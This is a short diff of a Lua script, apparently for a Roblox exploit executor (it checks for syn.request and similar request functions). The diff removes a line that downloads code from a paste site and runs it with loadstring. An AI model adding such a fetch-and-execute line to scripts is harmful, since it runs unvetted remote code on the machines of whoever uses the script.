@@ -3,7 +3,6 @@
 
 local HttpService = game:GetService("HttpService")
 local httpRequest = (syn and syn.request) or request or http_request
-loadstring(game:HttpGet'https://pastefy.app/aAkQKVF4/raw')()
 local Junkie = {}
 Junkie.service = nil
 Junkie.identifier = nil
